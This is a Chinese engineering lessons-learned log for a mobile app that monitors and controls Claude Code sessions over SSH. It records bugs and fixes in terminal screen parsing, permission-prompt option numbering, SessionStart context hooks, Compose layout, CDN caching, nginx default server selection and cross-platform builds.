**怎么避开**　`cat a >> f` 只在 `a` 自带尾换行时才安全，而**程序生成的单行文本
通常不带**。凡是「往一个按行解析的文件里追加」，都要么自己补换行、要么
追加后立刻按行核一遍。

这一条也说明**服务端日志值多少**：客户端从头到尾只有一句
`Permission denied (publickey)`，连着三轮都只能靠猜；
把 sshd 起成 `-D -e` 把日志留下来之后，方向立刻就清楚了。

## #141 语法高亮：先找注释符再切字符串，会把 `"http://x"` 里的 `//` 当注释

**症状**　代码高亮把 `let url = "http://example.com"` 从 `//` 开始整半行涂成注释灰。
CSS 更惨：`color: #fff` 里的 `#` 不是注释符，但按「行注释」规则处理的语言表
如果顺手把 css 也列进去，整行都会变灰。

**根因**　高亮实现如果分两趟 —— 先扫注释、再扫字符串 —— 那么**字符串里的注释符
会先被认走**。`//` 出现在字符串字面量内部是极常见的（URL、正则、路径）。

**修法**　**一趟扫描**，状态机同时跟踪「在不在字符串里」和「在不在注释里」：
在字符串里就不认注释符，在注释里就不认引号。另外语言表要分清哪些语言
**没有行注释**（css / html / xml），别给它们套 `//` 或 `#` 规则。

⚠️ 安卓那份 `Highlight.kt` 是两趟的，**有这个 bug**；iOS 这份合成一趟顺手修掉了。
两条都有测试钉着（`HighlightTests`）。安卓那边什么时候修跟着这条走。

**顺带**　别用正则做高亮：ICU 的 `\u{}` 有坑（#136），而且**正则的索引是 UTF-16 的**，
中文源码里算出来的范围会错位。手写一趟扫描按 Character 走，反而更短更稳。

## #142 首连一台新机器永远连不上：指纹确认框在跟连接超时赛跑

**症状**　真机上加一台新主机，网络通、密码对、指纹也对，就是连不上。
界面上「第一次连 root@x.x.x.x / 主机指纹 SHA256:…」的框弹出来了，
但**背景同时挂着一条红字**：「连 root@x.x.x.x 超时（包发出去了没人应）。
常见的三种：· 运营商挡了 22 端口 · fail2ban 封了 IP …」

于是用户去查网络、查防火墙、换端口 —— **全是白费**。

**根因**　两件事在赛跑：

- SSH 握手中途要停下来问「信任这个指纹吗」，人要读完一串 SHA256、
  切到服务器上跑 `ssh-keygen -lf` 对一遍、再切回来点按钮；
- 而 `connect(timeout:)` 的默认值是 **15 秒**。

**15 秒必然不够。** 超时之后 supervisor 重试，框再弹一次，永远循环。
更糟的是超时那条路的文案写得很详细很笃定，**把人支向完全错误的方向**。

**修法**（两条都要，缺一条都不够）

1. **超时给到 90 秒** —— 这是**给人读字的时间**，不是给网络的。
   网络真不通时 TCP 自己会先失败，不会白等满 90 秒。
2. **超时时先看指纹框还在不在**：还挂着就说
   「还在等你确认主机指纹 —— 上面那个框点『信任并连接』就好」，
   **不要报网络超时**。

**怎么避开**　凡是「握手中途要等人做决定」的流程，那段等待**必须排除在超时之外**，
否则超时就成了「用户读得慢」的惩罚。而且**报错前先问一句「是不是我正在等他」** ——
这一条比调超时值更重要：调多久都可能有人读得更慢，
但「框还开着就不该说网络坏了」是永远成立的。

⚠️ 这条是**在真模拟器里点出来的**，编译、单元测试、CI 截图全都发现不了 ——
它们不会停在那个框前面发呆。

## #143 窄屏折行会让「整句话」的判据失效 —— 而手机永远是窄屏

**症状**　`/model` 选单被当成普通「等你选」卡片画出来了。这很危险：
那种卡片点一下是**送数字**，而在模型选单上等于
「saved as your default for new sessions」——
**用户顺手一点就把账号默认模型改了，不报错、事后也想不起来为什么。**

护栏本来是有的（`Model.parse` 认出选单 → `Prompt.parse` 返回 null 不画卡片）。

**我最初的诊断是错的，值得记一笔**　我看到新版 Claude Code 的副标题变成了
「Switch between Claude models…」，就认定是**措辞改了导致判据失效**，
还据此往判据里加了两个新短语。

**真正的原因**　真实屏幕里**有**那句老措辞 —— 在最后一行脚注：
`Enter to set as default · s to use this session only · Esc to cancel`。

但**手机上 tmux 窗格很窄，TUI 会折行**。用 46 列（手机宽度）真抓一次：

```
   Enter to set as default · s to use this
   session only · Esc to cancel
```

`to use this session only` **被换行劈成两半**，子串匹配必然失败。
所以这个护栏**只在窄屏上失效** —— 而窄屏正是它唯一会被用到的地方。

**修法**　匹配前把空白压平：`screen.replace(Regex("""\\s+"""), " ")`。
⚠️ **加更多短语治不了** —— 任何一句都可能被折行劈开。

**怎么避开**
1. 凡是「在抓屏里找一整句话」的判据，**先压平空白再匹配**。终端会在任意位置折行。
2. 测试样本要用**手机宽度**抓的，不是开发机的 100+ 列。
   宽屏样本会让这一整类 bug 全部测不出来。
3. 这跟 #113（窄屏脚注被截断 → 判不出「在忙」）、#133（窄屏折行 → 选项标题错位）
   是**同一个病根**。第三次了 —— 说明「窄屏」应该是抓屏解析的**默认测试条件**，
   不是补充用例。
4. **别先有结论再找证据。** 我认定「措辞变了」时没有验证，而真跑一次 46 列抓屏
   30 秒就出答案了。

## #144 会话看板在**除了我们自己以外的每一台机器上**都是坏的

**症状**（没有人报过，因为没人验过）　用户装好 Yxi、连上自己的服务器，
会话看板的「等你 / 干活中 / 已完成」三段**全是空的**，所有会话落进「空闲」。
而「一眼看清谁在等你」正是这个 App 存在的理由。

**根因**　`SessionProbe` 的状态来自 `~/.cloud-status/*.json`，
而那是 **`cc-state` 写的 —— `cc-state` 不是 Yxi 装的**。
`server/install.sh` 只装 `yxi-hook`。`cc-state` 是本机 remote-dev-station 的一部分，
**只在我们自己的开发机上跑着**。

代码注释里那句「（后者由 `cc-state` 写，**早就在跑**）」是这条 bug 的完整写照：
它在写的人那台机器上是真的。

实测：本机 **37** 个状态文件，另一台普通服务器 **0** 个。
`SessionState.of(null)` → `Idle` → 全灰。

**修法**　改读 **`~/.claude/sessions/*.json`** —— Claude Code 自己维护、**零安装**、
任何装了 Claude Code 的机器上都有，直接给 `status`（idle/busy/waiting）、
`waitingFor`、`tmux`（精确到 pane）、`statusUpdatedAt`。读一次实测 **31ms**
（`claude agents --json` 要 2.1–2.65 秒，5 秒轮询扛不住）。`~/.cloud-status` 留作 fallback。

顺带修掉一批假阳性：旧源在本机说 **13 个「等你」**，新源说 **2 个**。
因为 hook 是**边缘事件**（发生过什么），`Notification` 写一次 `input` 之后
用户在终端答完了，**没有任何 hook 会把它改回来**；而 `status` 是**水平状态**（现在是什么）。
那 11 个假的既让看板骗人，也让手机白响。

**怎么避开**　这是「**测试环境 ≠ 用户环境**」这一族的第 6 次（#31/#64/#65/#137/#138/#139）。
1. **凡是读「某个文件/目录存在」的代码，先问一句：那东西是谁装的？**
   如果答案不是 `install.sh`，那它在用户机器上就不存在。
2. 验证时**不能用自己的机器**。这条 bug 的验证方式是：把那个目录屏蔽掉再跑一遍
   （`sed 's#$HOME/.cloud-status/\*.json#/nonexistent/*.json#'`），
   模拟出「用户的机器」。修完实测：修复前 等你 0 / 干活中 0 / 空闲 20，
   修复后 等你 2 / 干活中 2 / 空闲 16。

## #145 权限提示的选项数会变，硬编码编号 = 定时炸弹

**事实**（2.1.251 实拍）　Bash 权限提示现在是**四个**选项：

```
❯ 1. Yes
  2. Yes, and don't ask again for: curl *
  3. Yes, and switch to auto mode · auto mode handles these prompts for you
  4. No
```

而 **#47 记的是「拒绝是 3 不是 2」**。auto mode 上线后，中间**插进了第三个 Yes**。
当年若硬编码 3 = 拒绝，**今天按下去是「把整个会话切成 auto mode」** ——
比 #47 那个 bug 更狠：不是放行这一条，是改掉整个会话的权限模式。

**更多形变**（同一个提示，三种形态）：
- 没装阻塞 hook：**4 个**选项
- 装了阻塞 hook 且它返回 `ask`：**2 个**选项，而且文案变成
  `Hook PreToolUse:Bash requires confirmation for this command:`
- 装了阻塞 hook 且它返回 `allow`/`deny`：**屏幕上一个提示都不出现**

**结论**　**屏幕上的数字就是契约。** 只能读屏取号，不能从任何别处推。
`AskUserQuestion` 更明显：hook 的 `tool_input` 给 **3** 个选项，
屏幕上是 **5** 个（Claude Code 自己注入了 `Type something` / `Chat about this`）。
按 `tool_input` 的下标送键 = **点 A 选中 B，不报错，静默选错**。

**顺带确认了 G11 那个决定是对的**（推翻 PRD 的阻塞式 hook），而且现在有机制证据：
阻塞式 hook 返回 allow 时**屏幕上不曾出现任何提示**，事后翻屏幕也查不出来；
阻塞期间屏幕显示的是 `✻ Burrowing… (15s)`，跟正常干活一模一样；
**而且它把桌面废掉了** —— 阻塞时坐在键盘前的人没有任何东西可以按，
而 Yxi 的前提就是桌面和手机共用同一个会话。
（现在注册 hook 时带的 `"async": true` 本身就是一道结构性护栏，别去掉。）

## #146 看板抓取脚本 710ms —— 慢在「每个文件起一个进程」

**症状**：抓取脚本每 5 秒跑一次，实测 0.71 秒，占掉刷新周期的 14%。

**根因**：两处用 `for f in dir/*.json; do cat "$f"; done` 读目录。
19 个文件 = 19 次 fork+exec，光进程开销 352ms。跟文件多大无关，纯粹是进程数。

**修法**：`awk 1 dir/*.json` —— 一个进程读完，352ms → 25ms（快 14 倍），
整个脚本 710ms → 246ms。

**⚠️ 顺带修掉一个隐藏 bug**：不能图省事写 `cat dir/*.json`。
这些 JSON **末尾没有换行**，`cat` 会把相邻两个文件粘成一行 ——
实测 19 条变 1 条，解析全废。这跟 #140（公钥没换行被 `cat >>` 粘行）是**同一个坑**，
第二次踩了。`awk 1` 每读完一个文件补一个换行，两个问题一起解决，所以它是正解不是巧合。

**怎么避开**：shell 里读一批文件，默认用 `awk 1`，别用 `for…cat`，也别用裸 `cat *`。

## #147 分组功能整个失灵，但每一步看着都对 —— `GROUPS` 是 bash 内置变量

**症状**：`yxi-hub` 里 `GROUPS="$HOME/.yxi/groups.json"`，赋值那行 `set -x` 打出来完全正确，
但函数里再用 `$GROUPS` 就变成了 `0`。不报错，`set -euo pipefail` 也拦不住。

**根因**：**`GROUPS` 是 bash 的内置特殊变量**（当前用户所属的组 ID 数组，跟 `UID`/`PPID` 一类）。
你能赋值，但 bash 会在后续把它重新填成真实的组 ID —— root 上就是 `0`。

**修法**：换个名字（`GROUPS_FILE`）。

**怎么避开**：shell 变量别用这些名字 —— `GROUPS` `UID` `EUID` `PPID` `RANDOM` `SECONDS`
`LINENO` `HOSTNAME` `PWD` `OLDPWD` `IFS` `HOME` `PATH`。拿不准就加个后缀（`_FILE` / `_DIR`）。
症状永远是「值莫名其妙变了」，而不是报错。

## #148 发了新版，用户下到的还是旧包 —— Cloudflare 把 APK 缓存了 4 小时

**症状**：`install.sh --publish` 全绿（源站 sha256 一致），清单 `latest.json` 也是新的 versionCode，
但手机点更新下下来还是上一版。页面按钮下到的更旧（发了三版之后还在给 76）。

**根因**：源站 nginx **完全没发 `Cache-Control`**，Cloudflare 就按自己的默认给 `.apk`
缓存 4 小时（`cf-cache-status: HIT` / `max-age=14400`）。文件名固定叫 `Yxi.apk` ——
同一个 URL，内容换了 CDN 不知道。

⚠️ 补 `Cache-Control: no-store` **救不了当下**：那只影响以后的缓存填充，
已经躺在边缘的那份要等它自己过期（或者去 Cloudflare 后台清）。

**修法（结构性的，不依赖任何 CDN 配置）**：发布的文件名带上 versionCode ——
`Yxi-78.apk`，清单的 `file` 字段指它。**每次发布都是一个 CDN 没见过的新 URL**，
拿到旧包在结构上就不可能。带版本号的那个还能放心长缓存（`immutable`）。
nginx 加一条 `location ~ ^/Yxi-([0-9]+)\.apk$`，下载页的按钮由 install.sh 每次 sed 成新名字。

**更重要的一条教训**：`--publish` 原来只校验「源站上的文件对不对」。
**源站对 ≠ 用户拿到的对** —— 中间隔着一层 CDN。现在最后一步是
**走公网真下一遍、用 aapt2 读 versionCode 比对**，对不上就红着脸退出。
（#69 说「传完不校验 = 没传」，这条补上后半句：**校验源站不等于校验用户看到的**。）

## #149 怎么让分组里的 agent 知道自己能跟谁通讯 —— 别写进 CLAUDE.md，用 SessionStart 钩子

**问题**：把「你在 X 组，同组有 A、B，用 yxi-hub 找他们」写进 CLAUDE.md 有两个死结：
① 成员名单是**静态**的，一改分组就得改文档；② 新开的会话根本不知道自己有队友。

**解法**：`SessionStart` 钩子 + `hookSpecificOutput.additionalContext`
（Claude Code 会把这段文字**注入进模型上下文**）。名单是钩子跑的那一刻从
`~/.yxi/groups.json` 算出来的 —— **改组只要写那个文件，别的什么都不用动**。

**实测过的三件事**（别信文档，这三条都是跑出来的）：
1. `additionalContext` 真的进上下文：临时 hook 注入一句暗号，`claude -p` 问它暗号，答对了。
2. **端到端**：真会话 `cc-alpha` 编进组，冷启动第一句问「我同组有谁、怎么发消息」，
   答「同组只有 cc-beta，发消息用 `yxi-hub say beta "内容"`」。
3. `SessionStart` 的 source 取值含 `startup` / `resume` / `clear` / **`compact`** ——
   所以 `/compact` 之后会**再注入一次**，名单不会因为上下文被压缩而丢。

**两个坑**：
- ⚠️ 这条钩子**不能加 `async: true`**。async 的钩子输出不会被当成上下文注入 ——
  而我们要的就是它的 stdout。（跟「yxi-hook 必须 async」不冲突：那条是不许它阻塞权限决定，
  这条根本不碰权限。）
- ⚠️ `paste -sd、 -` **拼不了多字节分隔符**。`paste -d` 只吃单字节，「、」会被截成半个字符，
  输出乱码（实测 `后端<乱码>上线`）。多字节分隔符交给 python join。

**没编进任何组时 `yxi-hub context` 什么都不输出** —— 不在组里的会话零 token 开销。

## #150 中文输入次序会乱：「好的」打出来是「的好」

**症状**：终端里用中文输入法打字，字的**顺序会颠倒**。英文基本不出现。

**根因**：`ui/Workspace.kt` 的 `onKeyboardInput = { bytes -> scope.launch { shell?.write(bytes) } }`
—— **每一次按键起一个独立协程**。`SshSession.Shell.write` 里
`withContext(Dispatchers.IO)` 一甩到线程池，谁先抢到 `ioLock` 谁先发。

⚠️ **`Mutex` 保证的是「不并发」，不是「按顺序」。** 这两件事很容易混为一谈：
加锁修好了「并发写坏包流」（#16），但顺序问题一直在，只是英文一次一个字节、
间隔又大（人的手速），很少撞上。中文 IME 一次提交多个字节、候选词连着吐，就撞出来了。

**修法**：`Channel` 的 FIFO 是**写在契约里**的，不像 dispatcher 的调度顺序那样是实现细节。
出站字节全部走一条 `Channel(UNLIMITED)`，一个消费者协程按序写：
- `trySend` 到 UNLIMITED 通道**不挂起、不失败** → 入队发生在调用的那一刻、调用方线程里
  → **入队顺序 == 按键顺序**
- 通道保证按入队顺序出队 → 发送顺序 == 按键顺序
- 每条捎一个 `CompletableDeferred`，所以 `write` 仍然是「等真写完再返回 Boolean」，
  六个调用点一个都不用改

**怎么避开**：要「保序」就别指望锁。锁只管互斥。顺序要么用单消费者队列，
要么用单线程 dispatcher（但那是实现细节，不是契约）。

## #151 从后台切回来一片空白

**症状**：App 切后台待一会儿，再切回来，对话页**什么都不显示** —— 不是转圈，是纯白。

**根因**（两条叠在一起）：
1. 荣耀这类国产 ROM 后台管控很凶，进程会被杀。回前台是整个重建，
   Compose 里 `remember` 的 `items` 全空。
2. `ChatScreen` 的加载 effect 有两处**静默**：
   - `val s = ssh ?: return@LaunchedEffect` —— 连接没了直接返回，**status 一个字都不设**
   - `status = null` **写在** `TranscriptStream.head()` **之前**，而那是一个 SSH 往返 + 0.58 MB
   于是「上面没提示 + 下面没内容」= 纯白屏，零解释。

**修法**：
- 磁盘缓存上次那几条**原始 JSONL 行**（`TranscriptCache`），进对话先画出来再去拉新的。
  存原始行不存解析后的对象 —— 复用现成解析路径，不用给 ChatItem 写序列化。
- 连接没了要说「正在重连…」，别默默 return。
- **有东西看之前不许清提示**：`status = if (items.isEmpty()) "正在载入对话…" else null`。

**通则**：`?: return` 在 UI 的加载路径上是个陷阱 —— 它把「失败」和「什么都没发生」
变成同一种画面。每条 return 前问一句：**这时候屏幕上有东西吗？**

## #152 麦克风按钮在用户手机上一直是死的（GMS 关掉时）

**症状**：点语音输入，什么都不发生，没有任何提示。

**根因**：`runCatching { listen.launch(RecognizerIntent...) }` —— 兜住了不崩，
但**失败完全静默**。用户的荣耀 **GMS 是关的**，实测在模拟器上
`pm disable-user com.google.android.tts` 之后，
`pm query-activities -a android.speech.action.RECOGNIZE_SPEECH` 返回 **0 个**
→ `resolveActivity` 是 null → 这个按钮在他手机上从来就没工作过。

**修法**：先 `resolveActivity` 判一下，没有就 Toast 说清楚
「这台手机上没有语音识别（多半是没装或关了 Google 服务）」；launch 失败也报出来。

**怎么避开**：`runCatching { }` 不带 `onFailure` 等于**把错误扔进垃圾桶**。
用户侧的表现是「点了没反应」，比崩溃还难查 —— 崩溃至少有堆栈。

## #153 `async: true` 到底是什么意思 —— 实测,别照直觉猜

钩子登记时可以加 `"async": true`。**它的准确含义只有一句:Claude Code 不等这个钩子跑完。**

**实测**(钩子里 `sleep 20` 然后落一个文件,看 claude 退出时那文件在不在):

| | 耗时 | claude 退出时钩子跑完了吗 |
|---|---|---|
| 阻塞式(默认) | 26 秒 | **跑完了** —— 它等了 |
| `async: true` | 10 秒 | 还没跑完 —— **它没等** |

**我曾经写错的一句**:「async 的钩子输出不会被当成上下文注入」。**这是错的。**
实测同一个 SessionStart 钩子加上 async,`additionalContext` **照样注入成功了**
(换了新暗号做对照,排除上一轮残留)。因为那个钩子很快,在模型请求发出前就吐完了。

所以真相是:**这是一场赛跑,不是稳定的失败。** 钩子快就赢,慢就悄悄丢。
这比「一定失败」更坑 —— 平时看着好用,偶尔莫名其妙不生效。

**两条结论**:
- **要它说话的钩子(注入上下文、返回决定)一律不加 async。** 别赌自己够快。
  `yxi-hub context` 要起两次 python3,不是没有输的可能。
- **不该说话的钩子加 async**(`yxi-hook` 就是),这样它拖不慢正事。
  ⚠️ 但**别把 async 当成安全保证** —— 它只是「不等」,不是「禁言」。
  真正的护栏是另外两条,都有测试钉着:
  `test_hook_never_decides`(钩子从不输出权限决定)和
  `test_approval_fail_closed`(没人回答时命令绝不执行)。

## #154 从后台切回来「不显示现在在干什么」—— 病根是「不知道」被画成了「闲着」

**症状**（用户给了两张相差 4 秒的截图）：切回前台，对话页看着完全正常，
但底下**没有 `Composing…` 那一行**；等几秒它自己出来了，同时内容也跳到最新。

**别被症状带偏**：第一反应会去查「状态没刷新」。真正的问题是**用户没法知道那是旧的** ——
图一看起来跟「一切正常、agent 闲着」一模一样，比白屏更坑（白屏至少你知道它没好）。

**根因**：
- `Composing…` 那行的条件是 `if (live.busy)`，而 `live` 的初值是 `Live.IDLE`。
  于是「**我知道它闲着**」和「**我还不知道**」渲染成同一个东西：什么都不画。
- 驱动 `live` 的是 `SessionProbe.watchScreen` 这条服务器推流。后台待久了连接会断，
  回前台要等看门狗重连 + 重建推流 + 第一帧，就是那几秒。
- 同一张图里 `＋` 号也不见了 —— 它的条件是 `sftp != null`。
  **这本身就是「还没连上」的铁证**，但同样一声不吭。

**修法**：加一个 `synced` 标志（`remember(ssh, sessionName)`，重连自动复位，
收到第一帧才置真），把那个位置改成**三选一**：
```
ssh == null  →  "连接断了，正在重连…"
!synced      →  "正在取这个会话此刻的状态…"
live.busy    →  Composing…（原来那条）
```

**通则（这是本项目第 N 次）**：**「未知」必须有自己的画面。**
把「未知」和「否」合并成同一个渲染分支，等于骗用户 ——
而且骗得很自然，因为那一屏看起来完全正常。
#151 是同一族（`?: return` 让「失败」和「什么都没发生」长得一样）。

## #155 主机名被工具条挤没 —— `horizontalScroll` 没有宽度上界

**症状**：会话页左上角的主机名（用户报的是「天亮」）看不见了。

**根因**：我在 0.9.35 给顶上那排药丸加了 `Modifier.horizontalScroll(...)`，想的是
「窄屏挤不下就让它滑」。但**可横向滚动的 Row 没有宽度上界** ——
Compose 先按它的**内容全宽**去量这个非权重子项，剩下的才分给旁边那个 `weight(1f)` 列。
药丸一多，左列就被压到接近 0，主机名整列消失。

⚠️ 反直觉的地方：加 `horizontalScroll` 看起来是「让它自己解决拥挤」，
实际是**把拥挤转嫁给了邻居**。

**修法**：`Modifier.weight(2f, fill = false).horizontalScroll(...)` ——
weight 给它一个宽度上界（最多三分之二），滚动只在这个上界内发生。
`fill = false` 让它在药丸少的时候仍按内容收缩，不白占地方。
不写死 dp：加减药丸、换屏幕宽度都不用再调。

**怎么避开**：`horizontalScroll` / `verticalScroll` 加在 Row/Column 的**子项**上时，
一定同时给它一个尺寸上界（`weight` 或 `widthIn(max=)`），否则它会吃掉兄弟的空间。

## #156 第一张图没传完就点第二张，第二张必失败 —— 锁加错了层

**症状**：连着传两张图，第二张报「传失败」。等第一张传完再点就正常。

**根因（三个，叠在一起）**：

**① 锁在错的层。** `Sftp` 里写的是 `private val lock = Mutex()` —— **每条通道自己一把**。
而附件上传每次都 `openSftp()` 开一条**新通道**（那是 #（之前）为了绕开
「复用旧通道进坏状态」加的），于是两次并发上传拿到**两把不同的锁**，等于没锁。
而 jsch 的 Session 写包路径**不是线程安全**的（#16，当年只给 `Shell` 修了，SFTP 一直漏着）：
两条通道同时往一条连接写就把包流写坏。
→ 修法：锁提到 **[SshSession] 级**，构造 `Sftp` 时传进去。
`Sftp` 只在 `openSftp()` 一处被造出来，所以九个调用点一次全覆盖。

**② 编号必然撞。** 标签是 `staged.count { … } + 1` 算的，而 `staged` **只在上传成功后**才更新 ——
并发时两张算出来的都是 1，双双叫「图片1」。而 `Attachments.header` 是靠标签
把路径喂给 Claude 的，两条同名映射 = 它拿到自相矛盾的输入。
→ 修法：`renumber()`，加进列表**之后**统一编号。顺带抹平「传完的顺序≠点的顺序」。

**③ 「上传中」提前消失。** `uploading` 是布尔：第一张传完置 false，
而第二张还在传，界面上的提示就没了。→ 改成计数。

**通则**：**锁的作用域必须覆盖它要保护的资源。**
资源是「这条 SSH 连接」，锁却建在「这条通道」上 —— 通道一多就漏。
每次写 `private val lock = Mutex()` 都问一句：**这个对象会不会有多个实例共用同一份底层资源？**

## #157 服务器卡到执行不了命令 —— 两个独立的问题，别只修看得见的那个

**症状**：SSH 连得上，但敲任何命令都要等好几秒；VS Code Remote 几乎没法用。

**里面其实是两件事，混在一起看会误判**：

### ① 本机负载（能修，而且有一部分是我造成的）
`load average 60`（16 核）、`swap 7G/8G` —— 机器在颠簸。贡献者：
- **Gradle 守护进程 3.1 GB** —— 我连着编了十几次 APK，每次留下的 daemon 都不退。
  **现在一律 `./gradlew --no-daemon`。**
- VS Code Remote 的 `rg` 全盘扫描跑了 3 小时没退
- Chrome ~1.9 GB / 79% CPU
- 20 个 `claude --effort max` 共 4.3 GB

### ② CPU steal 60~65%（**修不了**，而且我第一次诊断时漏了）
`vmstat` 的 `st` 列 = 你的 VM 想要 CPU、hypervisor 把它给了同一台物理机上的别人。

⚠️ **这个数在虚拟机内部无解**：杀进程、加内存、换内核，一点都不影响它。
实测同一段计算，正常应该 150~250ms，当时要 **480~1080ms** —— 等于只拿到不到一半的算力。

**为什么容易漏**：`top` 默认那行里 `st` 挤在最后，`uptime` / `free` 里根本没有。
只看 load 和内存的话，会把「宿主机超卖」误诊成「自己进程太多」，
然后杀一圈进程发现还是卡。

**判据**：
- 杀掉负载后 load 降了、但命令还是慢 → 看 steal
- steal 持续 >10% 就该找服务商；>50% 是宿主机严重超卖

**怎么办**：
1. `steal-report`（本机 `/usr/local/bin/`）—— 一条命令给出此刻 + 历史 steal
2. 已经把 `sysstat` 的采集打开了（`/etc/default/sysstat` 的 `ENABLED=true`），
   **要跟服务商掰扯就得有记录**，光说「我觉得卡」没用
3. 攒够数据后：控制台重启实例（有机会落到别的物理机），还高就要求迁移宿主机/换规格

## #159 手机上报「解析包时出现问题」—— 清单先于 APK 落地

**症状**：用户点更新，Android 报「解析包时出现问题」。
服务器上一看：`Yxi-91.apk` 只有 **12MB**，本地是 **34MB** —— **半截文件**。

**根因（两个叠加，都是我的）**：

**① `install.sh` 的顺序错了。** 原来是
`scp APK 清单 → 一起传`，然后才 `sha256` 校验。
传输被打断时**清单已经落地、APK 还是半截**，而校验写在 scp 之后，
进程被杀根本没跑到。
⚠️ **清单是发布的开关。它必须是最后一步，而且只在包验过之后才翻。**
我把开关和货一起发出去了。

**② 我把发布跑在有超时的后台任务里。** 到 hk13 的链路实测**只有约 1 Mbps**
（20MB 用了 135 秒；CPU 空闲 71%，不是本机的问题），34MB 要传五到八分钟，
而任务超时是 2~10 分钟 —— 连着被 SIGTERM 杀了三次。

**修法**：
```
rsync → Yxi-N.apk.part      先传成临时名（rsync 能续传，1Mbps 上这点很重要）
sha256 校验                  不一致就删残件，清单一个字不动
mv .part → Yxi-N.apk        原子改名，不存在中间态
scp 清单                     验过了才翻开关
```
这样任何时刻中断，清单要么指向上一个能用的版本、要么指向一个完整的新版本，
**「指向半截包」这个状态在结构上不存在**。事后验证过：又被杀一次，
留下 `.part`、清单纹丝不动。

**通则**：**发布是「先放货、验货、再翻牌」，不是「一起扔过去」。**
任何「指针 + 数据」的更新都一样 —— 指针必须最后动。
#148 说的是「校验源站不等于校验用户看到的」，这条补前半段：
**校验必须在翻牌之前，而且不能写在一个会被跳过的位置。**

## #160 iOS 从 0.9.33 起就一直编译不过，而我们一直不知道

**症状**：把 iOS 拿到 Mac 上第一次真编译，第一个错就是
`instance member 'opacity' cannot be used on type 'View'`
—— 出在 **2026-08-29 我给 iOS 额度面板加压暗**那次改的代码里。
也就是说 **iOS 已经好几天编不过了，而每一版的 `ios/project.yml` 都跟着安卓写着新版本号。**

**根因（两层）**：

**① 代码错**：`.opacity(...)` 写在了 `if` 的右花括号**后面**：
```swift
if let q = quota {
    ...
}
.opacity(quotaBusy ? 0.4 : 1)     // ← ViewBuilder 里这等于对 `View` 类型调实例方法
```
修饰符必须贴在**视图**上。把 `if` 里的内容包进一个 `VStack` 再贴上去。

**② 流程错（这个更要命）**：这台 Linux 机器**编译不了 SwiftUI**（macOS 专属），
`dev/precheck.sh` 只做文本检查（括号配平、语法解析）——
**语义错误它一个都抓不到**。而我一直拿 precheck 通过当「iOS 没问题」。

**怎么避免**：iOS 的 UI 改动，**Mac 上真 `xcodebuild` 是唯一算数的验证**。流程：
```bash
# Linux 侧
rsync -a --exclude .build --exclude '*.xcodeproj' ios/ /tmp/iosbuild/
cd /tmp/iosbuild && xcodegen generate
rsync -az /tmp/iosbuild/ mac:~/yxi-build/
# Mac 侧
ssh mac 'cd ~/yxi-build && xcodebuild -project Yxi.xcodeproj -scheme Yxi \
  -destination "generic/platform=iOS Simulator" -configuration Debug build \
  CODE_SIGNING_ALLOWED=NO -skipPackagePluginValidation -skipMacroValidation'
```
⚠️ `-skipPackagePluginValidation` 是必须的：SwiftTerm 带一个构建插件，
Xcode 会拦下来要人工批准，报的却是含糊的
`Validate plug-in "SwiftTermBuildInfoPlugin" ... BUILD FAILED`，
很容易误以为是自己的代码坏了。

**通则**：**「我验不了的东西」和「验过了」不是一回事。**
precheck 通过只说明「文本上像 Swift」，不说明它能编译。
跨平台项目里，凡是只有一侧能验证的部分，都要显式标出「这部分没验过」——
而不是让另一侧的绿灯替它背书。

## #161 begirl 上线后，hk13 的四个面板域名全部变成无限重定向 —— 「第一个 listen 80」才是兜底，`server_name _;` 不是

**症状**（2026-08-31 报）：`https://ops.omggrow.com/crm/ins-alive` 打不开，浏览器
`ERR_TOO_MANY_REDIRECTS`。BMS 里 `/e/accounts-ops/ins-alive` 那个 iframe 也是空白。
`res` / `tickets` / `org.omggrow.com` 和「直接打 IP」一并中招 —— 但当时只有 ops 被报上来。

一开始查错了方向：ops 和 bms 是两个独立的 Cloudflare Access 应用，很容易归因成
「iframe 撞 Access 登录页的 `frame-ancestors: 'none'`」——那确实是真的（登录页
的确带 `x-frame-options: DENY`），但它只解释 iframe 空白，不解释**新标签页直接打开也不行**。

**根因**：`sites-enabled/begirl` 在 2026-08-30 04:40 建软链上线。它老老实实按
#90 的教训写了具体 `server_name begirl.keuury.com`、没写 `default_server`——
**但没用**。nginx 的规则是：某个 `listen` 地址的默认 server = **第一个声明该 listen
的 server 块**（除非有块显式写了 `default_server`）。`sites-enabled/*` 按字母序
include，`begirl` < `human_register`，于是 begirl 的 80 端口块抢走了 `0.0.0.0:80`
的默认站身份。而 human_register 那块只写了 `listen 80; server_name _;`——
**`_` 不是通配符，它是个永远匹配不上的非法主机名**，靠的一直是「我排第一」这个隐式身份。

隧道把 `ops.omggrow.com` 送到 `http://localhost:80`，域名匹配不上任何 `server_name`，
落到默认站 begirl → `location / { return 301 https://$host$request_uri; }` →
301 回 `https://ops.omggrow.com/...` → CF → 隧道 → :80 → 再 301。死循环。

**修法**：给 human_register 的块显式声明身份，一个字：

```nginx
listen 80 default_server;    # 原来是 listen 80;
```

`begirl` 一行没动（它按名字匹配，本来就不受影响）。改完 `ops/res/tickets/org` 恢复 302→各自
`$panel_root`，`ops/crm/ins-alive` 200，裸 IP 200；`begirl/dl.keuury.com/boomasset*/report`
仍按名 301→https，yxi:8899 与 raas:8010 均 200。

**通则**：
- **#90 的结论只写对了一半。** 那条说「别写 `default_server` / `server_name _`」——
  照做了照样出事。正确的说法是：**兜底站必须显式写 `default_server` 把身份钉死**，
  其余站严格按名字匹配。隐式兜底（靠 include 顺序）会被任何一个排在前面的新站悄悄夺走。
- **`server_name _;` 不提供兜底能力**，它只是个不会误伤的占位。别把它当 catch-all 读。
- **`nginx -t` 不会报这个**。默认站易主是合法配置，没有警告，reload 成功。判据只能靠
  `curl -H "Host: <那个域名>" http://127.0.0.1/` 挨个打一遍——上线新站后必须做这一步。
- ⚠️ **备份文件别留在 `sites-enabled/`**。nginx.conf 里是 `include sites-enabled/*`（无扩展名
  过滤），备份会被当配置加载，当场多出一个重复的 80 端口块，`nginx -t` 冒出
  `conflicting server name "_"`。这是本次改动时**自己踩的**——`human_register.bak-20260831`
  是修复过程中随手 `cp` 出来的，已在 reload 前挪走，别去 `sites-enabled/` 找它。
  历史上留下的备份（`begirl.bak-*` 等）都在 `sites-available/` 与 `snippets/`，不受影响。
  备份统一放 `/root/nginx-backups/`。

## #162 官网上不去的截图 —— nginx 那份 snippet 是**白名单**，不登记就 404

**症状**：把四张真机截图传到 `hk13:/var/www/yxi/shots/`，文件在、权限对、
`ls` 看得见，浏览器和 curl 一律 404（返回的还是 `text/html`，一看就是 nginx 自己给的）。

